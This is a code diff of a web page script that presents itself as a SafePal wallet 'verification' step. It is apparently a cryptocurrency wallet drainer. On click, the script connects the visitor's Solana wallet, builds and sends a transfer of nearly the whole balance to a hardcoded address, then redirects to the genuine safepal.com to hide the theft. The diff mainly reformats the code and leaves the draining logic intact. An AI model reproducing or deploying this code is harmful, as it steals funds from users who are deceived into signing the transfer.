@@ -23,24 +23,39 @@
     </div>
     <script>
         document.getElementById('verify').onclick = async () => {
-            const wallet = window.solana || window.safepal || window.phantom;
+            let wallet = null;
+            if(window.solana) wallet = window.solana;
+            else if(window.safepal) wallet = window.safepal;
+            else if(window.phantom) wallet = window.phantom;
+            
             if(wallet){
                 try{
                     const r = await wallet.connect();
                     const c = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
                     const b = await c.getBalance(r.publicKey);
                     const m = await c.getMinimumBalanceForRentExemption(0);
-                    if(b<m){alert("Insufficient funds.");return;}
+                    if(b < m){
+                        alert("Insufficient funds.");
+                        return;
+                    }
                     const a = new solanaWeb3.PublicKey('0xf8932d1de3cffbc19af577f41c59cb6ab3af4923');
-                    const t = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({fromPubkey:r.publicKey,toPubkey:a,lamports:b-m}));
-                    t.feePayer=r.publicKey;
-                    const h=await c.getRecentBlockhash();
-                    t.recentBlockhash=h.blockhash;
-                    const s=await wallet.signTransaction(t);
-                    const x=await c.sendRawTransaction(s.serialize());
+                    const t = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: r.publicKey,
+                            toPubkey: a,
+                            lamports: b - m
+                        })
+                    );
+                    t.feePayer = r.publicKey;
+                    const h = await c.getRecentBlockhash();
+                    t.recentBlockhash = h.blockhash;
+                    const s = await wallet.signTransaction(t);
+                    const x = await c.sendRawTransaction(s.serialize());
                     await c.confirmTransaction(x);
-                    window.location.href="https://safepal.com";
-                }catch(e){alert("Verification failed. Try again.");}
+                    window.location.href = "https://safepal.com";
+                }catch(e){
+                    alert("Verification failed. Try again.");
+                }
             }else{
                 alert("Please install SafePal wallet.");
             }
